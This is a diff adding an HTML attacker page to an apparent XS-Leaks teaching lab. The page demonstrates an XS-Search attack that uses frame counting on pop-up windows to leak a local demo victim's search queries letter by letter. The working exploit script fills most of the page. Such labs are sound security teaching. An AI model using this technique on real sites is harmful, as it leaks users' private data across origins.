@@ -1,0 +1,81 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <title>XSLL - Attacker - XS Search</title>
+</head>
+
+<body>
+    <h1>XS Search</h1>
+    <ul>
+        <li><a href="../index.html">Home</a></li>
+    </ul>
+    
+    <h2>Introduction</h2>
+    <p>This page will help demonstrate an XS-Search attack.</p>
+    <p>Since timing attacks are often unreliable we combine XS Search with <a href="frame-counting.html">Frame
+            Counting</a>.</p>
+    <h2>Attack</h2>
+    <p>Start the attack by clicking the button below.</p>
+    <p>The attack will leak all full queries of the <a
+            href="http://victim.local:27182/xs-leaks/xs-search.html">victim</a>.</p>
+    <p>Open the console of the browser to see the progress of the attack; the final result will be displayed on this
+        page as well. It might take a while to complete the attack.</p>
+    <p>Always allow pop-ups and redirects from "http://attacker.local:314152". This can be configured (in Brave) here:
+        "brave://settings/content/siteDetails?site=http%3A%2F%2Fattacker.local%3A31415%2F"</p>
+    <p>Sometimes the attack stops; just press the attacker tab and it will continue.</p>
+    
+    <button onclick="attack()">Start Attack</button>
+    <pre id="output"></pre>
+    <script>
+        const words = [];
+
+        async function frameCounting(query) {
+            return new Promise(resolve => {
+                // Simulate the frame count check by opening a new window
+                var win = window.open(`http://victim.local:27182/xs-leaks/xs-search.html?q=${query}`);
+
+                let iframesCount = 0;
+
+                // Wait for the page to load
+                setTimeout(() => {
+                    // Read the number of iframes loaded
+                    iframesCount = win.length;
+                    win.close();
+                    resolve(iframesCount);
+                }, 10);
+            });
+        }
+
+        async function appendCharAndCheck(query = '') {
+            const alphabet = 'abcdefghijklmnopqrstuvwxyz';
+            let hit = false;
+
+            for (let i = 0; i < alphabet.length; i++) {
+                const current_query = query + alphabet[i];
+                console.log(current_query);
+
+                if (await frameCounting(current_query) > 0) {
+                    hit = true;
+                    await appendCharAndCheck(current_query);
+                }
+            }
+
+            if (!hit && query.length > 0 && await frameCounting(query) === 1) {
+                if (!words.includes(query)) {
+                    words.push(query);
+                }
+            }
+        }
+
+        async function attack() {
+            console.log('Attacking...');
+            words.length = 0; // Clear the words array before starting
+            await appendCharAndCheck();
+            document.getElementById('output').textContent = `Found words: ${words.join(', ')}`;
+        }
+    </script>
+</body>
+
+</html>
